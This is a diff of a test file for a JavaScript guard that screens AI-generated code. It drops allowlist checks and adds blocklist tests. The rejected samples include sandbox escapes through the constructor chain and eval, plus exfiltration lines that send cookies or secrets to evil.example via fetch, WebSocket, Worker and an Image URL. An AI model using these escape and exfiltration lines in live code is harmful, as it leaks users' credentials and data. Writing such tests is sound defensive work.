@@ -1,21 +1,15 @@
 import { describe, expect, it } from "vitest";
 import { guardCode } from "./guard";
 
-const API = ["listTasks", "addTask", "setStatus", "highlight"];
-
-function check(code: string) {
-  return guardCode(code, { apiNames: API });
-}
-
 function expectRejected(code: string) {
-  const result = check(code);
+  const result = guardCode(code);
   expect(result.ok, `expected rejection, but this was accepted:\n${code}`).toBe(false);
   expect(result.reason).toBeTruthy();
   return result;
 }
 
 function expectAccepted(code: string) {
-  const result = check(code);
+  const result = guardCode(code);
   expect(result.ok, `expected acceptance, but it was rejected: ${result.reason}\n${code}`).toBe(true);
   return result;
 }
@@ -38,31 +32,89 @@ describe("legitimate code the model actually writes", () => {
     `);
   });
 
-  it("accepts safe built-ins", () => {
+  it("accepts built-ins, functions, try/catch and template literals", () => {
     expectAccepted(`
       const ids = new Set([1, 2, 3]);
-      const text = JSON.stringify({ max: Math.max(...ids) });
-      console.log(text);
-      return String(new Date().getFullYear()) + text.toUpperCase();
-    `);
-  });
-
-  it("accepts functions, try/catch and template literals", () => {
-    expectAccepted(`
       function double(n) { return n * 2; }
       const triple = (n) => n * 3;
       try {
-        return \`\${double(2)}-\${triple(3)}\`;
+        return \`\${double(2)}-\${triple(3)}-\${Math.max(...ids)}\` + JSON.stringify({ ok: true });
       } catch (error) {
-        return error.message;
+        console.log(error.message);
+        return String(new Date().getFullYear());
       }
     `);
   });
+});
 
-  it("accepts a named function referring to itself and hoisted declarations", () => {
+describe("the API may be a deep, dynamic object tree", () => {
+  // The guard restricts language constructs, not the app's vocabulary. It never
+  // sees the API object, so nothing here depends on knowing its keys up front.
+  it("accepts walking a nested app tree", () => {
     expectAccepted(`
-      return countdown(3);
-      function countdown(n) { return n <= 0 ? 0 : countdown(n - 1); }
+      const feature = kernel.model.features[0];
+      const width = feature.params.width;
+      kernel.sketch.session.commit({ width: width * 2 });
+      return kernel.model.features.map((f) => f.params);
+    `);
+  });
+
+  it("accepts names the guard has never heard of", () => {
+    // A function added to the API at runtime, a helper injected by the host,
+    // a library the app deliberately exposes – all fine.
+    expectAccepted(`
+      const schema = schemaForType("extrude");
+      return addFeatureCall("extrude", JSON.stringify({ depth: 10 }));
+    `);
+    expectAccepted("return dayjs().year();");
+  });
+
+  it("accepts app fields that happen to share a name with a blocked global", () => {
+    // `task.location` is the app's data, not window.location. Only the
+    // identifier *reference* is blocked, never a property name.
+    expectAccepted(`
+      const task = listTasks()[0];
+      return { where: task.location, who: task.parent, doc: task.document };
+    `);
+  });
+
+  it("accepts a dynamic key that is a variable", () => {
+    expectAccepted(`
+      const key = "width";
+      return kernel.params[key];
+    `);
+  });
+});
+
+describe("a blocked name only means the global of that name", () => {
+  // Blocking bare names would otherwise reject ordinary code: `open`, `parent`,
+  // `top` and `self` are variable names the model uses all the time.
+  it("accepts locally declared variables that shadow a blocked global", () => {
+    expectAccepted(`
+      const open = listTasks().filter((t) => !t.done);
+      const parent = open[0].parent;
+      let top = open.length;
+      for (const self of open) { top += self.estimate; }
+      return { open: open.length, parent, top };
+    `);
+  });
+
+  it("accepts them as parameters and destructured bindings", () => {
+    expectAccepted(`
+      const pick = ({ parent, top }, open) => parent + top + open;
+      function walk(document) { return document.id; }
+      return pick({ parent: 1, top: 2 }, 3) + walk({ id: 4 });
+    `);
+  });
+
+  it("still rejects the global when nothing declares it", () => {
+    expectRejected("return open;");
+    expectRejected("return parent.document;");
+    // Declared inside a function, used outside it: that is the real global.
+    expectRejected(`
+      function inner() { const open = 1; return open; }
+      inner();
+      return open("https://evil.example");
     `);
   });
 });
@@ -74,7 +126,7 @@ describe("sandbox escapes", () => {
 
   it("rejects the constructor chain to Function", () => {
     expectRejected(`return [].constructor.constructor("return globalThis")();`);
-    expectRejected(`return ({}).constructor;`);
+    expectRejected("return ({}).constructor;");
     expectRejected(`return listTasks["constructor"];`);
   });
 
@@ -84,111 +136,100 @@ describe("sandbox escapes", () => {
     expectRejected("return ({}).__proto__;");
   });
 
-  it("rejects computed access assembled from an expression", () => {
-    expectRejected(`return listTasks["constr" + "uctor"];`);
-    expectRejected(`const key = "constructor"; return listTasks[key.slice(0)];`);
-  });
-
   it("rejects eval, Function and dynamic import", () => {
     expectRejected(`return eval("1+1");`);
     expectRejected(`return new Function("return 1")();`);
     expectRejected(`return import("./secrets.js");`);
   });
 
-  it("rejects `arguments`", () => {
+  it("rejects `arguments`, Proxy and Reflect", () => {
     expectRejected("function f() { return arguments; } return f(1);");
+    expectRejected("return new Proxy({}, {});");
+    expectRejected("return Reflect.get({}, 'x');");
+  });
+
+  it("rejects a key assembled from an expression", () => {
+    expectRejected(`return listTasks["constr" + "uctor"];`);
+    expectRejected(`const key = "constructor"; return listTasks[key.slice(0)];`);
+    expectRejected("return kernel[keys[j]];");
   });
 });
 
-describe("unknown globals fail closed", () => {
-  // This is the property a blocklist cannot give you: names nobody thought to
-  // block are rejected simply because they resolve to nothing known.
-  it("rejects network access", () => {
-    expectRejected(`return fetch("https://evil.example");`);
-    expectRejected(`new WebSocket("wss://evil.example");`);
-    expectRejected(`navigator.sendBeacon("https://evil.example", "data");`);
-  });
-
-  it("rejects exfiltration through obscure globals", () => {
-    expectRejected(`const img = new Image(); img.src = "https://evil.example/?" + document.cookie;`);
-    expectRejected(`return new XMLHttpRequest();`);
-    expectRejected(`open("https://evil.example");`);
-    expectRejected(`return atob("aGk=");`);
-  });
-
-  it("rejects DOM, storage and app globals", () => {
-    expectRejected("return document.body.innerHTML;");
-    expectRejected("return window.location.href;");
+describe("the exfiltration channels", () => {
+  it("rejects the global object under every name it has", () => {
     expectRejected("return globalThis;");
-    expectRejected("return localStorage.getItem('token');");
-    expectRejected("return APP.config;");
+    expectRejected("return window.location.href;");
+    expectRejected("return self;");
+    expectRejected("return top.document;");
   });
 
-  it("rejects implicit globals created by assignment", () => {
-    expectRejected("leaked = listTasks; return 1;");
+  it("rejects the DOM", () => {
+    expectRejected("return document.cookie;");
+    expectRejected("return navigator.userAgent;");
+    expectRejected("history.back();");
   });
 
-  it("still rejects a shadowed name outside the scope that declares it", () => {
-    // The local `Image` must not make the *global* Image acceptable elsewhere.
-    expectRejected(`
-      function safe() { const Image = 1; return Image; }
-      safe();
-      return new Image();
-    `);
+  it("rejects every way out to the network", () => {
+    expectRejected(`return fetch("https://evil.example");`);
+    expectRejected("return new XMLHttpRequest();");
+    expectRejected(`new WebSocket("wss://evil.example");`);
+    // The one a naive blocklist forgets: an <img> is a GET request with a body
+    // you control.
+    expectRejected(`const img = new Image(); img.src = "https://evil.example/?" + secret;`);
+    expectRejected(`new Worker("https://evil.example/w.js");`);
+    expectRejected(`open("https://evil.example");`);
+  });
+
+  it("rejects storage", () => {
+    expectRejected(`return localStorage.getItem("token");`);
+    expectRejected("return sessionStorage.length;");
+    expectRejected("return indexedDB.databases();");
+  });
+
+  it("rejects timers, because setTimeout evaluates a string argument", () => {
+    expectRejected(`setTimeout("alert(1)", 0);`);
+    expectRejected("setInterval(() => {}, 100);");
+  });
+
+  it("rejects native dialogs", () => {
+    expectRejected(`alert("hi");`);
+    expectRejected(`return confirm("sure?");`);
   });
 });
 
-describe("scope resolution", () => {
-  it("accepts a local that shadows a forbidden global", () => {
-    expectAccepted(`const document = { title: "note" }; return document.title;`);
+describe("configuration", () => {
+  it("blocks the host's own globals when asked", () => {
+    expect(guardCode("return APP.config;").ok).toBe(true);
+    expect(guardCode("return APP.config;", { extraBlocked: ["APP"] }).ok).toBe(false);
   });
 
-  it("resolves names across nested scopes", () => {
-    expectAccepted(`
-      const outer = await listTasks();
-      const summarise = (items) => items.map((item) => {
-        const label = item.title;
-        return label;
-      });
-      return summarise(outer);
-    `);
-  });
-
-  it("resolves catch params and for-of bindings", () => {
-    expectAccepted(`
-      try { throw new Error("x"); } catch (problem) { console.log(problem.message); }
-      for (const task of await listTasks()) { console.log(task.id); }
-      return "ok";
-    `);
-  });
-
-  it("allows extra globals when the host opts in", () => {
-    expect(guardCode("return dayjs().year();", { apiNames: API }).ok).toBe(false);
-    expect(guardCode("return dayjs().year();", { apiNames: API, extraGlobals: ["dayjs"] }).ok).toBe(true);
+  it("can unblock a name the host needs", () => {
+    expect(guardCode("setTimeout(() => {}, 10);").ok).toBe(false);
+    expect(guardCode("setTimeout(() => {}, 10);", { allowBlocked: ["setTimeout"] }).ok).toBe(true);
   });
 });
 
 describe("limits and diagnostics", () => {
   it("rejects code above the length limit", () => {
-    const result = guardCode(`return "${"x".repeat(200)}";`, { apiNames: API, maxLength: 50 });
+    const result = guardCode(`return "${"x".repeat(200)}";`, { maxLength: 50 });
     expect(result.ok).toBe(false);
     expect(result.reason).toMatch(/too long/i);
   });
 
   it("rejects code above the node limit", () => {
-    const result = guardCode("return 1 + 1 + 1 + 1 + 1;", { apiNames: API, maxNodes: 5 });
+    const result = guardCode("return 1 + 1 + 1 + 1 + 1;", { maxNodes: 5 });
     expect(result.ok).toBe(false);
     expect(result.reason).toMatch(/too complex/i);
   });
 
   it("reports a syntax error instead of throwing", () => {
-    const result = check("return {;");
+    const result = guardCode("return {;");
     expect(result.ok).toBe(false);
     expect(result.reason).toMatch(/syntax error/i);
   });
 
   it("reports the line of the violation in the model's own source", () => {
-    const result = check("const a = 1;\nconst b = 2;\nreturn this;");
+    const result = guardCode("const a = 1;\nconst b = 2;\nreturn this;");
     expect(result.ok).toBe(false);
     expect(result.at?.line).toBe(3);
   });
